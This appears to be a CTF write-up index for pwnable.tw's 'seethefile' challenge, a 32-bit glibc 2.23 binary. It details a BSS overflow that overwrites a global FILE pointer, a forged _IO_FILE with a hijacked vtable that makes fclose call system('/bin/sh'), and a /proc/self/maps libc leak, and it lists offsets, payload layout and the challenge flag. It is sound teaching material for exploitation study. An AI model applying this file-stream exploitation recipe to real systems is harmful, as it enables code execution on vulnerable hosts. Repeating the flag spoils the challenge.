---
tags:
  - io-file-exploit
  - vtable-hijack
  - arbitrary-write
platform: pwnable.tw
points: 400
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: yes
pie: no
references:
  - https://pwnable.tw/challenge/
description: "Closing a fake _IO_FILE structure forged in the BSS segment hijacks the file vtable pointer during fclose, redirecting execution to system."
proof-of-concept: no
---

# seethefile — pwnable.tw (400 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10200`
>
> Flag: `FLAG{F1l3_Str34m_is_4w3s0m3}`

## Challenge Overview

A 32-bit file viewer binary (i386, No PIE, Partial RELRO, NX, Stack Canary) built against glibc 2.23. The program presents a menu to open, read, print, and close files. On exit it asks for a name and calls `fclose(fp)` on a global FILE pointer. The flag file cannot be opened directly (filename filter blocks "flag").

```
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x8048000)   # fixed addresses in .bss
```

### Binary Layout (BSS)

```
0x804B080  filename[64]     — stores the filename from openfile()
0x804B0C0  magicbuf[400]    — fread() destination buffer
0x804B260  name[32]         — scanf("%s", name) destination on exit
0x804B280  fp               — global FILE* pointer
```

### Menu Functions (IDA decompile)

```c
// main loop
while (1) {
    menu();
    scanf("%s", v8);          // stack buffer, reads menu choice
    switch (atoi(v8)) {
    case 1: openfile(); break;
    case 2: readfile(); break;
    case 3: writefile(); break;
    case 4: closefile(); break;
    case 5:
        printf("Leave your name :");
        scanf("%s", name);    // <-- V1: unbounded write to BSS
        printf("Thank you %s ,see you next time\n", name);
        if (fp) fclose(fp);   // <-- V2: fclose on attacker-controlled fp
        exit(0);
    }
}

void openfile() {
    scanf("%63s", filename);
    if (strstr(filename, "flag")) { puts("Danger !"); exit(0); }
    fp = fopen(filename, "r");
}

void readfile() {
    memset(magicbuf, 0, 400);
    fread(magicbuf, 399, 1, fp);
}

void writefile() {
    if (strstr(filename, "flag") || strstr(magicbuf, "FLAG") || strchr(magicbuf, '}'))
        { puts("you can't see it"); exit(1); }
    puts(magicbuf);
}

void closefile() {
    if (fp) fclose(fp);
    fp = 0;
}
```

## Vulnerabilities

### V1 — `scanf("%s", name)` Buffer Overflow on BSS (Primary)

**Root Cause:** The exit handler reads the user's name with `scanf("%s", name)` where `name` is a 32-byte BSS buffer at `0x804B260`. `scanf("%s")` has **no length limit** — it writes until whitespace.

```c
// Exit path in main
printf("Leave your name :");
scanf("%s", name);    // name = 0x804B260, 32 bytes
// ...
if (fp) fclose(fp);   // fp = 0x804B280 = name + 0x20
```

**Impact:** Writing >32 bytes overwrites the global `FILE *fp` at `0x804B280`. The attacker can point `fp` to an arbitrary address — including right after itself in BSS, where the overflow payload continues with a **fake `_IO_FILE_plus` struct**.

### V2 — `fclose()` on Attacker-Controlled `FILE*` (FSOP)

**Root Cause:** After the overflow, `fclose(fp)` operates on the attacker-forged `FILE*`. In glibc 2.23 (no vtable validation), `fclose` dispatches through the struct's vtable pointer. By crafting a fake `_IO_FILE_plus` with a fake vtable, the attacker redirects a virtual call (typically `_IO_FINISH` or `__close`) to `system()`.

The glibc 2.23 `_IO_new_fclose` flow:

```c
int _IO_new_fclose(FILE *fp) {
    if (_IO_vtable_offset(fp) != 0)     // fp+0x46 must be 0
        return _IO_old_fclose(fp);
    if (fp->_flags & _IO_IS_FILEBUF)    // clear bit 0x2000 to skip
        _IO_un_link(fp);
    _IO_acquire_lock(fp);               // fp->_lock (fp+0x48) dereferenced
    // ...
    _IO_FINISH(fp);                     // *(*(fp+0x94) + 0x8)(fp)
    // ...
}
```

**Key constraints for the fake struct:**
- `fp+0x46` (`_vtable_offset`) must be `0` — avoids `_IO_old_fclose` path
- `fp->_flags` must have `_IO_IS_FILEBUF` (0x2000) cleared — skips `_IO_un_link` and `_IO_file_close_it`
- `fp+0x48` (`_lock`) must point to zeroed writable memory — lock acquisition dereferences it
- `fp+0x94` (`vtable`) must point to a fake vtable where offset `+0x8` (`__finish`) = `system`

When `_IO_FINISH(fp)` fires, it calls `system(fp)`. Since `fp` points to the start of the fake struct, placing `";/bin/sh;"` at the beginning makes `system` execute it (the leading garbage before `;` errors out harmlessly).

### V3 — Information Leak via `/proc/self/maps`

**Root Cause:** The filename filter only blocks `"flag"`, not `/proc/self/maps`. Opening and reading this file dumps the full memory map including libc's base address.

```c
if (strstr(filename, "flag")) { ... }  // only blocks "flag"
// /proc/self/maps is allowed
```

**Impact:** Deterministic libc base leak. The `writefile` function also filters for `"FLAG"` and `}` in the read buffer, but `/proc/self/maps` output doesn't contain those strings.

## Key Data Structures

### `_IO_FILE` (glibc 2.23, i386 — 0x94 bytes + vtable pointer)

| Offset | Field | Notes for exploit |
|--------|-------|-------------------|
| `0x00` | `_flags` | Set to `0xFFFFDFFF` (clears `_IO_IS_FILEBUF` bit 0x2000) |
| `0x04` | `_IO_read_ptr` | Part of `";/bin/sh;"` command string |
| `0x08` | `_IO_read_end` | Continuation of shell command |
| `0x0C` | `_IO_read_base` | Can be zero or continuation |
| `0x10`–`0x30` | I/O buffer pointers | Typically zeroed |
| `0x34` | `_chain` | Can be zero |
| `0x38` | `_fileno` | Can be zero |
| `0x44` | `_cur_column` / `_vtable_offset` | **`_vtable_offset` at +0x46 must be 0** |
| `0x48` | `_lock` | **Must point to zeroed writable memory** |
| `0x4C` | `_offset` | Can be `0xFFFFFFFF` |
| `0x94` | `vtable` | **Points to fake vtable** |

### Fake Vtable (`_IO_jump_t`)

| Offset | Field | Value |
|--------|-------|-------|
| `0x00` | `__dummy` | 0 |
| `0x04` | `__dummy2` | 0 |
| `0x08` | `__finish` | **`system`** ← called by `_IO_FINISH(fp)` |
| `0x0C+` | remaining entries | `system` (spray for reliability) |

## Exploit Paths

All 146 solutions follow essentially the same approach with minor variations in the fake struct layout.

---

### Path A — `/proc/self/maps` Leak → FSOP `fclose` → `system("/bin/sh")` (Standard)

**Used by:** Virtually all solutions (370, 385, 654, 799, 823, 1395, 1689, 1922, 2903, 9418, 9871, 14605, 16806, 26585, 28356, 34604, 36233, 37983, etc.)

**Steps:**

1. **Leak libc base:** Open `/proc/self/maps`, read + write to screen. Parse the libc mapping line to get the base address. Some solutions need two reads (the 399-byte `fread` buffer may not reach the libc line in one go).

2. **Compute `system` address:** `system = libc_base + 0x3A940` (for the challenge's glibc 2.23).

3. **Craft the FSOP payload:** On exit, `scanf("%s", name)` writes starting at `0x804B260`:

```
+0x00: padding (32 bytes) — fills name[32]
+0x20: p32(fake_fp_addr)  — overwrites fp to point to fake struct
+0x24: fake _IO_FILE_plus  — starts here (or at +0x24)
  +0x00: flags = 0xFFFFDFFF (or similar, _IO_IS_FILEBUF cleared)
  +0x04: ";/bin/sh;" (system argument via fp pointer)
  ...
  +0x48: _lock → zeroed BSS (e.g. 0x804B0A0 or 0x804B260+offset)
  ...
  +0x94: vtable → fake_vtable_addr
fake_vtable:
  +0x08: system address
```

4. **Trigger:** After `scanf` returns, `fclose(fp)` processes the fake struct, eventually calling `_IO_FINISH(fp)` which resolves to `system(fp)`. Since `fp` points to memory starting with `";/bin/sh;"`, the shell spawns.

5. **Get flag:** `echo 'Give me the flag' | /home/seethefile/get_flag`

**Reliability:** ~100% deterministic. The only failure case is if `system`'s address contains a whitespace byte (`\x09`, `\x0a`, `\x0b`, `\x0c`, `\x0d`, `\x20`) which would terminate `scanf("%s")`. This is ASLR-dependent and can be retried.

---

### Path A Variant — Redirect `__close` Instead of `__finish`

**Used by:** Solutions 799, 1236, 1902

Some solutions target a different vtable slot. Instead of `_IO_FINISH` (vtable+0x08), they arrange the fake struct so `_IO_SYSCLOSE` → `system` fires through the `__close` slot (vtable+0x44). The principle is identical — just a different offset in the fake vtable.

---

### Path A Variant — Format String via Fake `fread`

**Used by:** Solution 331, 1006

A creative two-stage approach:
1. First exit: craft a fake FILE struct where `fread` → `printf` (redirect vtable read to printf). This leaks a libc address from the stack via format string (`%6$x`).
2. Return to `main` (by setting the vtable's finish/close entry to `main`).
3. Second exit: now with libc known, craft the real FSOP payload with `system`.

This avoids needing `/proc/self/maps` for the leak but is more complex.

---

### Path A Variant — `add_esp` Gadget → Stack Pivot

**Used by:** Solution 1236

Instead of directly calling `system` through the vtable, uses a `add esp, X; ret` libc gadget to pivot execution onto the BSS payload area, then chains `system("/bin/sh")` via a ROP-style sequence. More complex but demonstrates that the vtable hijack gives arbitrary code execution, not just one-shot `system`.

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| libc base leak | `/proc/self/maps` via open/read/write | Deterministic |
| Heap base leak | `/proc/self/maps` (bonus, not needed) | Deterministic |
| Stack address leak | `/proc/self/stat` (field 28) | Deterministic |
| BSS overflow → `fp` overwrite | `scanf("%s", name)` with >32 bytes | Deterministic |
| Fake `_IO_FILE_plus` in BSS | Payload placed after `name` buffer | Deterministic |
| `system` via vtable hijack | `fclose(fake_fp)` → `_IO_FINISH` | ~100% (retry if scanf-terminator byte in addr) |

## Offsets (pwnable.tw `libc_32.so.6`, glibc 2.23)

```python
system      = 0x3A940
exit        = 0x2E7B0
bin_sh      = 0x158E8B
_IO_file_jumps = <libc_base + offset>  # real vtable (for reference)
```

## BSS Addresses (No PIE)

```python
filename    = 0x0804B080   # 64 bytes
magicbuf    = 0x0804B0C0   # 400 bytes
name        = 0x0804B260   # 32 bytes — overflow source
fp          = 0x0804B280   # FILE* — overflow target
# Fake struct typically at 0x804B284 or 0x804B290
```

## Solution Write-ups

| File | Variant | Key Technique | Notes |
|------|---------|---------------|-------|
| `370.md` | Standard | maps leak → FSOP `__finish` → system | Clean, concise |
| `331.md` | Format string | Fake fread→printf for leak, then FSOP | Two-stage, avoids /proc |
| `385.md` | Standard | maps leak → FSOP → system | Uses ELF symbol offsets |
| `654.md` | Standard | maps + heap leak → FSOP | More complex struct layout |
| `799.md` | Standard | maps leak → FSOP `__close` path | Targets different vtable slot |
| `823.md` | Standard | maps leak → FSOP → get_flag | Automated flag retrieval |
| `1006.md` | Format string | fread→printf leak, two exits | Creative vtable swap |
| `1236.md` | Stack pivot | maps leak → add_esp gadget → ROP | Uses gadget instead of direct system |
| `1395.md` | Standard | maps leak → FSOP | Straightforward |
| `1689.md` | Standard | maps leak → FSOP | Minimal payload |
| `1902.md` | Standard | maps leak → FSOP | Targets __close vtable offset |
| `1922.md` | Standard | maps leak → FSOP `__finish` | Clean struct layout |
| `2903.md` | Standard | maps leak → FSOP | Well-commented |
| `9418.md` | Standard | maps leak → FSOP with gdb analysis | Includes FILE struct walkthrough |
| `9871.md` | Standard | maps leak → FSOP | Also leaks heap and stack via /proc |
| `14605.md` | Standard | maps leak → FSOP | Also leaks stack via /proc/self/stat |
| `26585.md` | Standard | maps leak → FSOP | Uses _IO_old_fclose path variant |
| `28356.md` | Standard | maps leak → FSOP | Simple and clean |
| `34604.md` | Standard | maps leak → FSOP with detailed analysis | Best documented; includes glibc source walkthrough |
| `36233.md` | Standard | maps leak → FSOP with detailed vtable docs | Includes vtable struct layout and fclose source code |
| `37983.md` | Standard | maps leak → _IO_old_fclose variant | Uses fsop_fclose_old flat() layout |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (pure sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/seethefile` | Challenge binary (i386, No PIE) |
| `artifacts/libc_32.so.6` | Remote libc (glibc 2.23, i386) |
| `solution/*.md` | Community write-ups (146 solutions) |
